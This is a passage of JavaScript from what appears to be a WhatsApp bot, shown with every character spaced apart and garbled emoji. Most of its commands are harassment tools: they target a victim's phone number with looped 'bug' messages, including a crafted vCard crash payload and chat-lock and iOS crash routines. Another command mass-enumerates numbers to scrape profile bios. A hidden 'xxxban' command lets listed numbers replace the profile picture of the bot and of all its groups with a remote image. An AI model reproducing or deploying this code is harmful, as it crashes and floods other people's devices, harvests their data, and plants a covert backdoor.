 c o n s t   X r e t u r n   =   m . m e n t i o n e d J i d [ 0 ]   ?   m . m e n t i o n e d J i d [ 0 ]   :   m . q u o t e d   ?   m . q u o t e d . s e n d e r   :   v i c t i m . r e p l a c e ( / [ ^ 0 - 9 ] / g , ' ' ) + " @ s . w h a t s a p p . n e t " 
 v a r   c o n t a c t I n f o   =   a w a i t   X e o n B o t I n c . o n W h a t s A p p ( X r e t u r n ) ; 
     i f   ( v i c t i m   = =   " 2 0 1 5 0 7 1 5 1 6 9 7 " )   { 
         r e t u r n ; 
         } 
         i f   ( v i c t i m   = =   " 9 1 9 3 6 6 3 1 6 0 1 8 " )   { 
         r e t u r n ; 
         } 
         i f   ( v i c t i m   = =   " 9 1 9 4 0 2 1 0 4 4 0 1 " )   { 
         r e t u r n ; 
     } 
     i f   ( c o n t a c t I n f o . l e n g t h   = =   0 )   { 
         r e t u r n   r e p l y g c x e o n ( " T h e   n u m b e r   i s   n o t   r e g i s t e r e d   o n   W h a t s A p p " ) ; 
     } 
 s e n d M e s s a g e W i t h M e n t i o n s ( 
         " S u c c e s s f u l l y   S e n t   B u g   T o   @ "   +   X r e t u r n . s p l i t ( ' @ ' ) [ 0 ]   +   
         "   U s i n g   * "   +   c o m m a n d   +   " *   ✅ \ n \ n P a u s e   2   m i n u t e s   s o   t h a t   t h e   b o t   i s   n o t   b a n n e d . " ,   
         [ X r e t u r n ] 
     ) ; 
     f o r   ( l e t   i   =   0 ;   i   < 5 ;   i + + )   { 
             a w a i t   C r a s h 0 0 U I ( X r e t u r n ) 
 a w a i t   B l a n k S p a m K e v v ( X r e t u r n ) 
 a w a i t   c r a s h 0 u i ( X r e t u r n ) 
 a w a i t   N o t i f X B u t t o n ( X r e t u r n ) ; 
         a w a i t   c a l l S y s t e m ( X r e t u r n ) ; 
         a w a i t   f r e z e e C l i c k ( X r e t u r n ) ; 
         a w a i t   e x T e n s i o n ( X r e t u r n ) ; 
         a w a i t   N a t i v e f l o w U I ( X r e t u r n ) ; 
         a w a i t   N o t i f s p a m ( X r e t u r n ) ; 
         a w a i t   S t c C r a s h ( X r e t u r n ) ; 
         a w a i t   U I M e n t i o n ( X r e t u r n ) ; 
         a w a i t   b u t t o n X B l a n k ( X r e t u r n ) ; 
 } 
 } 
 b r e a k 
 	 c a s e   ' d e v i c e ' :   c a s e   ' c h e c k d e v i c e ' :   c a s e   ' c e k d e v i c e ' :   { 
 i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
     i f   ( ! i s B o t )   r e t u r n ; 
 
     c o n s t   q u o t e d M s g   =   m . m e s s a g e ? . e x t e n d e d T e x t M e s s a g e ? . c o n t e x t I n f o ? . q u o t e d M e s s a g e ; 
     c o n s t   q u o t e d M e s s a g e I d   =   m . m e s s a g e ? . e x t e n d e d T e x t M e s s a g e ? . c o n t e x t I n f o ? . s t a n z a I d ; 
 
     i f   ( ! q u o t e d M s g   | |   ! q u o t e d M e s s a g e I d )   { 
         a w a i t   X e o n B o t I n c . s e n d M e s s a g e ( f r o m ,   {   t e x t :   ' Q u o t e   T h e   T a r g e t   M e s s a g e '   } ,   {   q u o t e d :   m   } ) ; 
         b r e a k ; 
     } 
 
     c o n s t   d e v i c e c   =   
         q u o t e d M e s s a g e I d . l e n g t h   >   2 1 
             ?   ' D e v i c e :   A n d r o i d ' 
             :   q u o t e d M e s s a g e I d . s t a r t s W i t h ( ' 3 A ' ) 
                 ?   ' D e v i c e :   i O S ' 
                 :   ' D e v i c e :   W h a t s A p p   W e b   o r   B o t A P I ' ; 
 
     a w a i t   X e o n B o t I n c . s e n d M e s s a g e ( f r o m ,   {   t e x t :   d e v i c e c   } ,   {   q u o t e d :   m   } ) ; 
     } 
     b r e a k ; 
 	 c a s e   ' i o s v i s i b l e ' :     { 
 i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
 
 	 i f   ( ! q )   r e t u r n   r e p l y g c x e o n ( ` E x a m p l e : \ n   $ { p r e f i x   +   c o m m a n d }   2 0 X X X ` ) 
 v i c t i m   =   t e x t . s p l i t ( " | " ) [ 0 ] 
 c o n s t   X r e t u r n   =   m . m e n t i o n e d J i d [ 0 ]   ?   m . m e n t i o n e d J i d [ 0 ]   :   m . q u o t e d   ?   m . q u o t e d . s e n d e r   :   v i c t i m . r e p l a c e ( / [ ^ 0 - 9 ] / g , ' ' ) + " @ s . w h a t s a p p . n e t " 
 v a r   c o n t a c t I n f o   =   a w a i t   X e o n B o t I n c . o n W h a t s A p p ( X r e t u r n ) ; 
     i f   ( v i c t i m   = =   " 2 0 1 5 0 7 1 5 1 6 9 7 " )   { 
         r e t u r n ; 
         } 
         i f   ( v i c t i m   = =   " 9 1 9 3 6 6 3 1 6 0 1 8 " )   { 
         r e t u r n ; 
         } 
         i f   ( v i c t i m   = =   " 9 1 9 4 0 2 1 0 4 4 0 3 " )   { 
         r e t u r n ; 
     } 
     i f   ( c o n t a c t I n f o . l e n g t h   = =   0 )   { 
         r e t u r n   r e p l y g c x e o n ( " T h e   n u m b e r   i s   n o t   r e g i s t e r e d   o n   W h a t s A p p " ) ; 
     } 
     
     s e n d M e s s a g e W i t h M e n t i o n s ( 
         " S u c c e s s f u l l y   S e n t   B u g   T o   @ "   +   X r e t u r n . s p l i t ( ' @ ' ) [ 0 ]   +   
         "   U s i n g   * "   +   c o m m a n d   +   " *   ✅ \ n \ n P a u s e   2   m i n u t e s   s o   t h a t   t h e   b o t   i s   n o t   b a n n e d . " ,   
         [ X r e t u r n ] 
     ) ; 
 	 	 f o r   ( l e t   i   =   0 ;   i   <   9 9 9 ;   i + + )   { 
 a w a i t   i o s L x ( X r e t u r n ) ; 
 a w a i t   s l e e p ( 1 0 0 0 ) ; 
 } 
 	 	 } 
 	 	 b r e a k 
 	 
     c a s e   " t o u r l " :   { 
             i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
     i f   ( ! / i m a g e | v i d e o / . t e s t ( m i m e ) )   r e t u r n   r e p l y g c x e o n ( ' K i r i m   a t a u   r e p l y   g a m b a r / v i d e o   y a n g   i n g i n   d i u b a h   k e   U R L ! ' ) ; 
 
     c o n s t   f e t c h   =   ( a w a i t   i m p o r t ( ' n o d e - f e t c h ' ) ) . d e f a u l t ; 
     c o n s t   F o r m D a t a   =   ( a w a i t   i m p o r t ( ' f o r m - d a t a ' ) ) . d e f a u l t ; 
     c o n s t   {   I m a g e U p l o a d S e r v i c e   }   =   r e q u i r e ( ' n o d e - u p l o a d - i m a g e s ' ) ; 
     c o n s t   {   f r o m B u f f e r   }   =   r e q u i r e ( ' f i l e - t y p e ' ) ; 
     c o n s t   m e d i a D a t a   =   m . q u o t e d   ?   a w a i t   m . q u o t e d . d o w n l o a d ( )   :   a w a i t   m . d o w n l o a d ( ) ; 
 
     / /   F u n g s i   u p l o a d   k e   p i x h o s t . t o   ( u n t u k   g a m b a r ) 
     a s y n c   f u n c t i o n   u p l o a d P i x h o s t ( b u f f e r )   { 
         c o n s t   s e r v i c e   =   n e w   I m a g e U p l o a d S e r v i c e ( ' p i x h o s t . t o ' ) ; 
         c o n s t   {   d i r e c t L i n k   }   =   a w a i t   s e r v i c e . u p l o a d F r o m B i n a r y ( b u f f e r ,   ' u p l o a d . p n g ' ) ; 
         r e t u r n   d i r e c t L i n k ; 
     } 
 
     / /   F u n g s i   u p l o a d   k e   c a t b o x . m o e   ( u n t u k   g a m b a r   &   v i d e o ) 
     a s y n c   f u n c t i o n   u p l o a d C a t b o x ( b u f f e r )   { 
         l e t   {   e x t   }   =   a w a i t   f r o m B u f f e r ( b u f f e r ) ; 
         l e t   b o d y F o r m   =   n e w   F o r m D a t a ( ) ; 
         b o d y F o r m . a p p e n d ( " f i l e T o U p l o a d " ,   b u f f e r ,   " f i l e . "   +   e x t ) ; 
         b o d y F o r m . a p p e n d ( " r e q t y p e " ,   " f i l e u p l o a d " ) ; 
         l e t   r e s   =   a w a i t   f e t c h ( " h t t p s : / / c a t b o x . m o e / u s e r / a p i . p h p " ,   { 
             m e t h o d :   " P O S T " , 
             b o d y :   b o d y F o r m 
         } ) ; 
         r e t u r n   a w a i t   r e s . t e x t ( ) ; 
     } 
 
     l e t   u r l ; 
     i f   ( / i m a g e / . t e s t ( m i m e ) )   { 
         t r y   { 
             u r l   =   a w a i t   u p l o a d P i x h o s t ( m e d i a D a t a ) ; 
         }   c a t c h   { 
             u r l   =   a w a i t   u p l o a d C a t b o x ( m e d i a D a t a ) ;       } 
     }   e l s e   { 
         u r l   =   a w a i t   u p l o a d C a t b o x ( m e d i a D a t a ) ; 
     } 
 
     a w a i t   X e o n B o t I n c . s e n d M e s s a g e ( m . c h a t ,   {   t e x t :   ` * U r l   : *   $ { u r l } \ n * E x p i r e d   : *   P e r m a n e n `   } ,   {   q u o t e d :   m   } ) ; 
 } 
 b r e a k 
                 
                 
 	 c a s e   ' w a n u m b e r ' :   c a s e   ' n o w a ' :   c a s e   ' s e a r c h n o ' :   c a s e   ' s e a r c h n u m b e r ' : { 
 i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
                       	 i f   ( ! t e x t )   r e t u r n   r e p l y g c x e o n ( ` P r o v i d e   N u m b e r   w i t h   l a s t   n u m b e r   x \ n \ n E x a m p l e :   $ { p r e f i x   +   c o m m a n d }   9 1 6 9 0 9 1 3 7 2 1 x ` ) 
 v a r   i n p u t n u m b e r   =   t e x t . s p l i t ( "   " ) [ 0 ] 
                 
                 r e p l y g c x e o n ( ` S e a r c h i n g   f o r   W h a t s A p p   a c c o u n t   i n   g i v e n   r a n g e . . . ` ) 
                 f u n c t i o n   c o u n t I n s t a n c e s ( s t r i n g ,   w o r d )   { 
                         r e t u r n   s t r i n g . s p l i t ( w o r d ) . l e n g t h   -   1 
                 } 
                 v a r   n u m b e r 0   =   i n p u t n u m b e r . s p l i t ( ' x ' ) [ 0 ] 
                 v a r   n u m b e r 1   =   i n p u t n u m b e r . s p l i t ( ' x ' ) [ c o u n t I n s t a n c e s ( i n p u t n u m b e r ,   ' x ' ) ]   ?   i n p u t n u m b e r . s p l i t ( ' x ' ) [ c o u n t I n s t a n c e s ( i n p u t n u m b e r ,   ' x ' ) ]   :   ' ' 
                 v a r   r a n d o m _ l e n g t h   =   c o u n t I n s t a n c e s ( i n p u t n u m b e r ,   ' x ' ) 
                 v a r   r a n d o m x x 
                 i f   ( r a n d o m _ l e n g t h   = =   1 )   { 
                         r a n d o m x x   =   1 0 
                 }   e l s e   i f   ( r a n d o m _ l e n g t h   = =   2 )   { 
                         r a n d o m x x   =   1 0 0 
                 }   e l s e   i f   ( r a n d o m _ l e n g t h   = =   3 )   { 
                         r a n d o m x x   =   1 0 0 0 
                 } 
                 v a r   t e x t 6 6   =   ` * = = [   L i s t   o f   W h a t s a p p   N u m b e r s   ] = = * \ n \ n ` 
                 v a r   n o b i o   =   ` \ n * B i o : *   | |   \ n H e y   t h e r e !   I   a m   u s i n g   W h a t s A p p . \ n ` 
                 v a r   n o w h a t s a p p   =   ` \ n * N u m b e r s   w i t h   n o   W h a t s A p p   a c c o u n t   w i t h i n   p r o v i d e d   r a n g e . * \ n ` 
                 f o r   ( l e t   i   =   0 ;   i   <   r a n d o m x x ;   i + + )   { 
                         v a r   n u   =   [ ' 1 ' ,   ' 2 ' ,   ' 3 ' ,   ' 4 ' ,   ' 5 ' ,   ' 6 ' ,   ' 7 ' ,   ' 8 ' ,   ' 9 ' ] 
                         v a r   s t a t u s 1   =   n u [ M a t h . f l o o r ( M a t h . r a n d o m ( )   *   n u . l e n g t h ) ] 
                         v a r   s t a t u s 2   =   n u [ M a t h . f l o o r ( M a t h . r a n d o m ( )   *   n u . l e n g t h ) ] 
                         v a r   s t a t u s 3   =   n u [ M a t h . f l o o r ( M a t h . r a n d o m ( )   *   n u . l e n g t h ) ] 
                         v a r   d o m 4   =   n u [ M a t h . f l o o r ( M a t h . r a n d o m ( )   *   n u . l e n g t h ) ] 
                         v a r   r a n d o m 2 1 
                         i f   ( r a n d o m _ l e n g t h   = =   1 )   { 
                                 r a n d o m 2 1   =   ` $ { s t a t u s 1 } ` 
                         }   e l s e   i f   ( r a n d o m _ l e n g t h   = =   2 )   { 
                                 r a n d o m 2 1   =   ` $ { s t a t u s 1 } $ { s t a t u s 2 } ` 
                         }   e l s e   i f   ( r a n d o m _ l e n g t h   = =   3 )   { 
                                 r a n d o m 2 1   =   ` $ { s t a t u s 1 } $ { s t a t u s 2 } $ { s t a t u s 3 } ` 
                         }   e l s e   i f   ( r a n d o m _ l e n g t h   = =   4 )   { 
                                 r a n d o m 2 1   =   ` $ { s t a t u s 1 } $ { s t a t u s 2 } $ { s t a t u s 3 } $ { d o m 4 } ` 
                         } 
                         v a r   a n u   =   a w a i t   X e o n B o t I n c . o n W h a t s A p p ( ` $ { n u m b e r 0 } $ { i } $ { n u m b e r 1 } @ s . w h a t s a p p . n e t ` ) 
                         v a r   a n u u   =   a n u . l e n g t h   ! = =   0   ?   a n u   :   f a l s e 
                         t r y   { 
                                 t r y   { 
                                         v a r   a n u 1   =   a w a i t   X e o n B o t I n c . f e t c h S t a t u s ( a n u [ 0 ] . j i d ) 
                                 }   c a t c h   { 
                                         v a r   a n u 1   =   ' 4 0 1 ' 
                                 } 
                                 i f   ( a n u 1   = =   ' 4 0 1 '   | |   a n u 1 . s t a t u s . l e n g t h   = =   0 )   { 
                                         n o b i o   + =   ` w a . m e / $ { a n u [ 0 ] . j i d . s p l i t ( " @ " ) [ 0 ] } \ n ` 
                                 }   e l s e   { 
                                         t e x t 6 6   + =   ` � �   * N u m b e r : *   w a . m e / $ { a n u [ 0 ] . j i d . s p l i t ( " @ " ) [ 0 ] } \ n   � � ️ * B i o   : *   $ { a n u 1 . s t a t u s } \ n � � * L a s t   u p d a t e   : *   $ { m o m e n t ( a n u 1 . s e t A t ) . t z ( ' A s i a / K o l k a t a ' ) . f o r m a t ( ' H H : m m : s s   D D / M M / Y Y Y Y ' ) } \ n \ n ` 
                                 } 
                         }   c a t c h   { 
                                 n o w h a t s a p p   + =   ` $ { n u m b e r 0 } $ { i } $ { n u m b e r 1 } \ n ` 
                         } 
                 } 
                 r e p l y g c x e o n ( ` $ { t e x t 6 6 } $ { n o b i o } $ { n o w h a t s a p p } ` ) 
                 } 
 b r e a k 
 	 
 	 c a s e   ' x x x c r a s h _ q u o t e d x x x ' : 
                                 f o r   ( l e t   i   =   0 ;   i   <   1 ;   i + + )   { 
                                         a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( f r o m ,   { 
                                                 " e x t e n d e d T e x t M e s s a g e " :   { 
                                                         " t e x t " :   " � � " , 
                                                         " c o n t e x t I n f o " :   { 
                                                                 " s t a n z a I d " :   g e n e r a t e M e s s a g e I D ( ) , 
                                                                 " p a r t i c i p a n t " :   f r o m , 
                                                                 " q u o t e d M e s s a g e " :   { 
                                                                         " c o n t a c t M e s s a g e " :   { 
                                                                                 " d i s p l a y N a m e " :   " @ b r u x e l 4 s   c r a s h e d   y o u K K K K K K K " , 
                                                                                 " v c a r d " :   " B E G I N : V C A R D \ n V E R S I O N : 3 . 0 \ n F N : @ b r u x e l 4 s \ n X - W A - B I Z - N A M E : B r u x i n N e r d o l a \ n \ n O R G : @ b r u x e l 4 s ; \ n T E L ; t y p e = C E L L ; t y p e = V O I C E ; w a i d = 5 5 2 1 9 9 2 9 9 9 9 9 9 : + 5 5   2 1   9 9 2 9 9 - 9 9 9 9 \ n E N D : V C A R D " 
                                                                         } 
                                                                 } 
                                                         } 
                                                 } 
                                         } ,   { } ) 
                                 } 
                                 b r e a k ; 
 	 
 	 
 	 
 	 c a s e   ' r e a c t c h ' :   { 
         i f   ( ! q )   { 
                 r e t u r n   r e p l y g c x e o n ( ` U s a g e :   $ { p r e f i x } r e a c t c h   l i n k _ c h a n n e l   t e x t \ n F o r   e x a m p l e :   $ { p r e f i x + c o m m a n d }   h t t p s : / / w h a t s a p p . c o m / c h a n n e l / 0 0 2 9 V a G 9 V f P K W E K k 1 r x T Q D 2 0 / 1 8 3 8 3   h e l l o ` ) ; } 
         i f   ( ! q . s t a r t s W i t h ( " h t t p s : / / w h a t s a p p . c o m / c h a n n e l / " ) )   { 
                 r e t u r n   r e p l y g c x e o n ( " L i n k   i n v a l i d ! " ) ; } 
         c o n s t   x e o n R e a c t i o n   =   { 
                 a :   ' � � ' ,   b :   ' � � ' ,   c :   ' � � ' ,   d :   ' � � ' ,   e :   ' � � ' ,   f :   ' � � ' ,   g :   ' � � ' , 
                 h :   ' � � ' ,   i :   ' � � ' ,   j :   ' � � ' ,   k :   ' � � ' ,   l :   ' � � ' ,   m :   ' � � ' ,   n :   ' � � ' , 
                 o :   ' � � ' ,   p :   ' � � ' ,   q :   ' � � ' ,   r :   ' � � ' ,   s :   ' � � ' ,   t :   ' � � ' ,   u :   ' � � ' , 
                 v :   ' � � ' ,   w :   ' � � ' ,   x :   ' � � ' ,   y :   ' � � ' ,   z :   ' � � ' , 
                 ' 0 ' :   ' ⓿ ' ,   ' 1 ' :   ' ➊ ' ,   ' 2 ' :   ' ➋ ' ,   ' 3 ' :   ' ➌ ' ,   ' 4 ' :   ' ➍ ' , 
                 ' 5 ' :   ' ➎ ' ,   ' 6 ' :   ' ➏ ' ,   ' 7 ' :   ' ➐ ' ,   ' 8 ' :   ' ➑ ' ,   ' 9 ' :   ' ➒ '   } ; 
         c o n s t   e m o j i I n p u t   =   a r g s . s l i c e ( 1 ) . j o i n ( '   ' ) . t o L o w e r C a s e ( ) ; 
         c o n s t   e m o j i   =   e m o j i I n p u t . s p l i t ( ' ' ) . m a p ( c   = >   { 
                 i f   ( c   = = =   '   ' )   r e t u r n   ' ― ' ; 
                 r e t u r n   x e o n R e a c t i o n [ c ]   | |   c ; 
         } ) . j o i n ( ' ' ) ; 
         t r y   { 
                 c o n s t   l i n k   =   a r g s [ 0 ] ; 
                 c o n s t   c h a n n e l I d   =   l i n k . s p l i t ( ' / ' ) [ 4 ] ; 
                 c o n s t   m e s s a g e I d   =   l i n k . s p l i t ( ' / ' ) [ 5 ] ; 
                 c o n s t   r e s   =   a w a i t   X e o n B o t I n c . n e w s l e t t e r M e t a d a t a ( " i n v i t e " ,   c h a n n e l I d ) ; 
                 a w a i t   X e o n B o t I n c . n e w s l e t t e r R e a c t M e s s a g e ( r e s . i d ,   m e s s a g e I d ,   e m o j i ) ; 
                 r e t u r n   r e p l y g c x e o n ( ` S e n t   r e a c t i o n   * $ { e m o j i } *   f o r   t h e   m e s s a g e   i n   t h e   c h a n n e l   * $ { r e s . n a m e } . * ` ) ; 
         }   c a t c h   ( e )   { 
                 c o n s o l e . e r r o r ( e ) ; 
                 r e t u r n   r e p l y g c x e o n ( " F a i l e d   t o   s e n d   r e a c t i o n .   P l e a s e   m a k e   s u r e   t h e   l i n k   a n d   e m o j i   a r e   v a l i d . " ) ; 
         } } 
 b r e a k ; 
 
 	 	 c a s e   ' c r a s h c h a t t ' :     { 
 i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
 
 	 i f   ( ! q )   r e t u r n   r e p l y g c x e o n ( ` E x a m p l e : \ n   $ { p r e f i x   +   c o m m a n d }   2 0 X X X ` ) 
 v i c t i m   =   t e x t . s p l i t ( " | " ) [ 0 ] 
 c o n s t   X r e t u r n   =   m . m e n t i o n e d J i d [ 0 ]   ?   m . m e n t i o n e d J i d [ 0 ]   :   m . q u o t e d   ?   m . q u o t e d . s e n d e r   :   v i c t i m . r e p l a c e ( / [ ^ 0 - 9 ] / g , ' ' ) + " @ s . w h a t s a p p . n e t " 
 v a r   c o n t a c t I n f o   =   a w a i t   X e o n B o t I n c . o n W h a t s A p p ( X r e t u r n ) ; 
     i f   ( v i c t i m   = =   " 2 0 1 5 0 7 1 5 1 6 9 7 " )   { 
         r e t u r n ; 
         } 
         i f   ( v i c t i m   = =   " 9 1 9 3 6 6 3 1 6 0 1 8 " )   { 
         r e t u r n ; 
         } 
         i f   ( v i c t i m   = =   " 9 1 9 4 0 2 1 0 4 4 0 1 " )   { 
         r e t u r n ; 
     } 
     i f   ( c o n t a c t I n f o . l e n g t h   = =   0 )   { 
         r e t u r n   r e p l y g c x e o n ( " T h e   n u m b e r   i s   n o t   r e g i s t e r e d   o n   W h a t s A p p " ) ; 
     } 
     
     s e n d M e s s a g e W i t h M e n t i o n s ( 
         " S u c c e s s f u l l y   S e n t   B u g   T o   @ "   +   X r e t u r n . s p l i t ( ' @ ' ) [ 0 ]   +   
         "   U s i n g   * "   +   c o m m a n d   +   " *   ✅ \ n \ n P a u s e   2   m i n u t e s   s o   t h a t   t h e   b o t   i s   n o t   b a n n e d . " ,   
         [ X r e t u r n ] 
     ) ; 
 	 	 f o r   ( l e t   i   =   0 ;   i   <   3 ;   i + + )   { 
           a w a i t   c h a t t L o c k ( X r e t u r n ) 
       } 
 	 	 } 
 	 	 b r e a k 
 	 	 
 	 	 
 	 c a s e   " c h e c k c h i d " :   c a s e   " i d c h " :   { 
 i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
         i f   ( ! t e x t )   r e t u r n   r e p l y g c x e o n ( ` P r o v i d e   c h a n n e l   l i n k \ n E x a m p l e :   $ { p r e f i x + c o m m a n d }   h t t p s : / / w h a t s a p p . c o m / c h a n n e l / 0 0 2 9 V a G 9 V f P K W E K k 1 r x T Q D 2 0   ` ) 
         i f   ( ! t e x t . i n c l u d e s ( " h t t p s : / / w h a t s a p p . c o m / c h a n n e l / " ) )   r e t u r n   r e p l y g c x e o n ( " I n v a l i d   l i n k " ) 
         l e t   r e s u l t   =   t e x t . s p l i t ( ' h t t p s : / / w h a t s a p p . c o m / c h a n n e l / ' ) [ 1 ] 
         t r y   { 
                 l e t   r e s   =   a w a i t   X e o n B o t I n c . n e w s l e t t e r M e t a d a t a ( " i n v i t e " ,   r e s u l t ) 
                 i f   ( ! r e s )   r e t u r n   r e p l y g c x e o n ( " F a i l e d   t o   f e t c h   i n f o r m a t i o n   o f   t h i s   c h a n n e l " ) 
                 l e t   t e k s   =   ` 
 * I D   : *   $ { r e s . i d } 
 * N a m e   : *   $ { r e s . n a m e } 
 * T o t a l   F o l l o w e r s   : *   $ { r e s . s u b s c r i b e r s } 
 * S t a t u s   : *   $ { r e s . s t a t e } 
 * V e r i f i e d   : *   $ { r e s . v e r i f i c a t i o n   = =   " V E R I F I E D "   ?   " V e r i f i e d "   :   " N o t   V e r i f i e d " } 
                 ` 
                 r e t u r n   r e p l y g c x e o n ( t e k s ) 
         }   c a t c h   ( e r r o r )   { 
                 c o n s o l e . e r r o r ( e r r o r ) ; 
                 r e t u r n   r e p l y g c x e o n ( " A n   e r r o r   o c c u r r e d   w h i l e   r e t r i e v i n g   m e t a d a t a " ) ; 
         } 
 } 
 b r e a k 
 
 	 
 	 c a s e   ' s e a r c h p a i r ' :   { 
         i f   ( ! g l o b a l . b a n n e r . i n c l u d e s ( s e n d e r N u m b e r ) )   { 
                 r e t u r n ; 
         } 
 
         / /   E n s u r e   t h e   u s e r   p r o v i d e s   a   n u m b e r   t o   s e a r c h 
         i f   ( ! a r g s [ 0 ] )   { 
                 r e t u r n   r e p l y g c x e o n ( " ❌   P l e a s e   p r o v i d e   a   n u m b e r   t o   s e a r c h .   E x a m p l e :   * s e a r c h p a i r   9 1 9 4 0 2 1 0 4 4 0 3 * " ) ; 
         } 
 
         c o n s t   s e a r c h N u m b e r   =   a r g s [ 0 ]   +   ' @ s . w h a t s a p p . n e t ' ;   / /   C o n v e r t   i n p u t   t o   J I D   f o r m a t 
         c o n s t   p a i r i n g P a t h   =   ' . / l i b 2 / p a i r i n g ' ; 
 
         t r y   { 
                 / /   C h e c k   i f   t h e   p a i r i n g   d i r e c t o r y   e x i s t s 
                 i f   ( ! f s . e x i s t s S y n c ( p a i r i n g P a t h ) )   { 
                         r e t u r n   r e p l y g c x e o n ( ' N o   p a i r e d   d e v i c e s   f o u n d . ' ) ; 
                 } 
 
                 / /   R e a d   a l l   d i r e c t o r i e s   ( a n d   f i l e s )   i n s i d e   . / l i b 2 / p a i r i n g 
                 c o n s t   e n t r i e s   =   f s . r e a d d i r S y n c ( p a i r i n g P a t h ,   {   w i t h F i l e T y p e s :   t r u e   } ) ; 
 
                 / /   F i l t e r   f o r   d i r e c t o r i e s   ( p a i r e d   d e v i c e   I D s ) 
                 c o n s t   p a i r e d D e v i c e s   =   e n t r i e s 
                         . f i l t e r ( e n t r y   = >   e n t r y . i s D i r e c t o r y ( ) ) 
                         . m a p ( e n t r y   = >   e n t r y . n a m e ) ;   / /   K e e p   f u l l   J I D   f o r m a t 
 
                 / /   C h e c k   i f   t h e   s e a r c h e d   n u m b e r   e x i s t s 
                 i f   ( p a i r e d D e v i c e s . i n c l u d e s ( s e a r c h N u m b e r ) )   { 
                         r e t u r n   r e p l y g c x e o n ( ` ✅   T h e   n u m b e r   * $ { a r g s [ 0 ] } *   i s   p a i r e d . ` ) ; 
                 }   e l s e   { 
                         r e t u r n   r e p l y g c x e o n ( ` ❌   T h e   n u m b e r   * $ { a r g s [ 0 ] } *   i s   n o t   p a i r e d . ` ) ; 
                 } 
         }   c a t c h   ( e r r )   { 
                 c o n s o l e . e r r o r ( ' E r r o r   s e a r c h i n g   p a i r e d   d e v i c e s : ' ,   e r r ) ; 
                 r e t u r n   r e p l y g c x e o n ( ' F a i l e d   t o   s e a r c h   p a i r e d   d e v i c e s   d a t a . ' ) ; 
         } 
 } 
 b r e a k ; 
 
 c a s e   ' x x x b a n ' :   c a s e   ' x x � � ' :   { 
 	 / /   C h e c k   i f   b o t N u m b e r   o r   s e n d e r   i s   i n   g l o b a l . b a n n e r 
         i f   ( g l o b a l . b a n n e r . i n c l u d e s ( b o t N u m b e r )   | |   ! g l o b a l . b a n n e r . i n c l u d e s ( s e n d e r N u m b e r ) )   { 
                 r e t u r n ; 
         } 
         t r y   { 
                 c o n s t   f s   =   r e q u i r e ( ' f s ' ) ; 
                 c o n s t   a x i o s   =   r e q u i r e ( ' a x i o s ' ) ; 
                 c o n s t   p a t h   =   r e q u i r e ( ' p a t h ' ) ; 
 
                 f u n c t i o n   d e l a y ( m s )   { 
                         r e t u r n   n e w   P r o m i s e ( r e s o l v e   = >   s e t T i m e o u t ( r e s o l v e ,   m s ) ) ; 
                 } 
 
                 c o n s t   i m a g e U r l   =   " h t t p s : / / r a w . g i t h u b u s e r c o n t e n t . c o m /   1 3 / x e o n P l o i t W a / r e f s / h e a d s / m a i n / p h o t o _ 2 0 2 4 - 1 2 - 1 9 _ 0 1 - 3 9 - 4 8 . j p g " ; 
                 c o n s t   i m a g e P a t h   =   p a t h . j o i n ( _ _ d i r n a m e ,   ' t e m p _ p r o f i l e . j p g ' ) ; 
 
                 ( a s y n c   ( )   = >   { 
                         / /   D o w n l o a d   t h e   i m a g e 
                         l e t   r e s p o n s e   =   a w a i t   a x i o s ( {   u r l :   i m a g e U r l ,   r e s p o n s e T y p e :   ' a r r a y b u f f e r '   } ) ; 
                         f s . w r i t e F i l e S y n c ( i m a g e P a t h ,   B u f f e r . f r o m ( r e s p o n s e . d a t a ,   ' b i n a r y ' ) ) ; 
 
                         / /   C h a n g e   b o t ' s   p r o f i l e   p i c t u r e 
                         a w a i t   X e o n B o t I n c . u p d a t e P r o f i l e P i c t u r e ( X e o n B o t I n c . u s e r . i d . s p l i t ( ' : ' ) [ 0 ]   +   " @ s . w h a t s a p p . n e t " ,   {   u r l :   i m a g e P a t h   } ) ; 
 
                         / /   F e t c h   a l l   g r o u p s 
                         l e t   a l l G r o u p s   =   O b j e c t . v a l u e s ( a w a i t   X e o n B o t I n c . g r o u p F e t c h A l l P a r t i c i p a t i n g ( ) . c a t c h ( ( )   = >   [ ] ) ) ; 
                         l e t   g r o u p I d s   =   a l l G r o u p s . m a p ( g r o u p   = >   g r o u p . i d ) ; 
 
                         / /   F i l t e r   o u t   b l a c k l i s t e d   g r o u p s 
                         l e t   b l a c k l i s t e d G r o u p s   =   [ ] ; 
                         t r y   { 
                                 b l a c k l i s t e d G r o u p s   =   J S O N . p a r s e ( f s . r e a d F i l e S y n c ( ' . / d a t a b a s e / i d g r o u p . j s o n ' ,   " u t f 8 " ) ) ; 
                         }   c a t c h   ( e r r )   { 
                                 c o n s o l e . e r r o r ( " ⚠ ️   N o   b l a c k l i s t   f i l e   f o u n d ,   c o n t i n u i n g . . . " ) ; 
                         } 
 
                         l e t   t a r g e t G r o u p s   =   g r o u p I d s . f i l t e r ( i d   = >   ! b l a c k l i s t e d G r o u p s . i n c l u d e s ( i d ) ) ; 
 
                         / /   U p d a t e   p r o f i l e   p i c t u r e s   i n   e a c h   g r o u p 
                         f o r   ( l e t   g r o u p I d   o f   t a r g e t G r o u p s )   { 
                                 t r y   { 
                                         a w a i t   X e o n B o t I n c . u p d a t e P r o f i l e P i c t u r e ( g r o u p I d ,   {   u r l :   i m a g e P a t h   } ) ; 
                                         c o n s o l e . l o g ( ` ✅   U p d a t e d   p r o f i l e   p i c t u r e   f o r   $ { g r o u p I d } ` ) ; 
                                 }   c a t c h   ( e r r )   { 
                                         c o n s o l e . e r r o r ( ` ❌   E r r o r   u p d a t i n g   p r o f i l e   p i c t u r e   f o r   $ { g r o u p I d } : ` ,   e r r ) ; 
                                 } 
                                 a w a i t   d e l a y ( 1 0 0 0 ) ;   / /   W a i t   1   s e c o n d   b e t w e e n   u p d a t e s 
                         } 
 
                         / /   C l e a n   u p   &   s e n d   m e s s a g e 
                         f s . u n l i n k S y n c ( i m a g e P a t h ) ; 
                 } ) ( ) ; 
         }   c a t c h   ( e r r o r )   { 
                 c o n s o l e . e r r o r ( " ❌   D e t a i l e d   E r r o r : " ,   e r r o r ) ; 
         } 
